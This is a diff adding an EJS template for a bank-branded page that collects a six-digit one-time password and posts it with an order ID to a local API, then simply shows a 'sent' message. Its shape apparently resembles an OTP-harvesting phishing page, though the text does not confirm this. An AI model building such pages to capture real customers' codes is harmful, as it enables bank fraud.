@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= t.otpTitle %> - <%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #c8a84e 0%, #d4af37 25%, #f0d060 50%, #d4af37 75%, #c8a84e 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .otp-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .otp-logo {
+            margin-bottom: 20px;
+        }
+        .otp-logo img {
+            width: 180px;
+        }
+        .otp-instruction {
+            color: #555;
+            font-size: 15px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .otp-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-family: 'Cairo', sans-serif;
+            margin-bottom: 20px;
+            transition: border-color 0.3s;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #d4af37;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #d4af37, #c8a84e);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: opacity 0.3s;
+            margin-bottom: 15px;
+        }
+        .submit-btn:hover {
+            opacity: 0.9;
+        }
+        .otp-hint {
+            color: #999;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-container">
+        <div class="otp-logo">
+            <img src="/images/logo-gold.png" alt="<%= t.bankName %>">
+        </div>
+        <p class="otp-instruction"><%= t.otpInstruction %></p>
+
+        <form id="otpForm">
+            <input type="text" id="otpCode" class="otp-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" required placeholder="------">
+            <button type="submit" class="submit-btn"><%= t.otpSubmit %></button>
+        </form>
+
+        <p class="otp-hint"><%= t.otpHint %></p>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var lang = params.get('lang') || 'ar';
+        var orderId = parseInt(params.get('orderId'));
+
+        document.getElementById('otpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var otp = document.getElementById('otpCode').value;
+            if (!otp) return;
+
+            var data = {
+                orderId: orderId,
+                otp: otp
+            };
+
+            fetch('/api/submit-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok) {
+                    document.querySelector('.submit-btn').disabled = true;
+                    document.querySelector('.submit-btn').textContent = '<%= t.otpSent %>';
+                }
+            })
+            .catch(function(err) {
+                console.error(err);
+            });
+        });
+    })();
+    </script>
+</body>
+</html>
